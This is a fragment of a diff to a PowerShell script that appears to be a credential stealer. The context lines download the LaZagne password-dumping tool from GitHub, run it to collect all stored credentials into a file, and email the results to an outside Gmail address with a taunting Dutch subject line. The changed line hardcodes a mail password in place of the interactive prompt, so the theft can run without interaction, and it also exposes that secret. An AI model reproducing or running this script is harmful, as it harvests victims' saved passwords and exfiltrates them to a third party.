@@ -95,7 +95,7 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 & "$dir\lazagne.exe" all > "$dir\output.txt"
 
 if (-not $MailCredentials) {
-    $MailCredentials = Get-Credential
+    $MailCredentials = "HerbertdePervert69@"
 }
 # this is simple replacement (drag & drop to Send-MailMessage)
 Send-EmailMessage -To 'herbertswindel@gmail.com' -Subject 'Hier zijn uw gegevens kameraad!' -Body 'Groetjes, Herbert Swindel' -SmtpServer 'smtp.office365.com' -From 'herbertswindel@outlook.com' `
